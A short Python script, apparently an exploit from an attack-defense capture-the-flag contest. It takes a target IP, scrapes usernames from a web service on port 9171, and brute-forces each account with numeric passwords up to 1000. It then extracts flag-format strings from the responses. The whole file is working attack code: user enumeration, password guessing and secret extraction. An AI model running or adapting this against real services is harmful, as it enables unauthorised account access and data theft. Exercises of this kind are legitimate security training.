#!/usr/bin/env python3

import re
import sys

import requests

ip = sys.argv[1]

r = requests.get(f'http://{ip}:9171/users/')
users = re.findall('href="/users/([^/]*)/"', r.text)
for user in users:
    print(f'Starting {user}')
    cur = 0
    while True:
        cur += 1
        r = requests.post(f'http://{ip}:9171/users/{user}/', data={'password': str(cur)})
        if 'invalid guess' not in r.text:
            print(f'Done in {cur} tries')
            print(re.findall('[A-Z0-9]{31}=', r.text), flush=True)
            break

        if cur % 100 == 0:
            print('Bruteforcing', cur)
        if cur > 1000:
            break
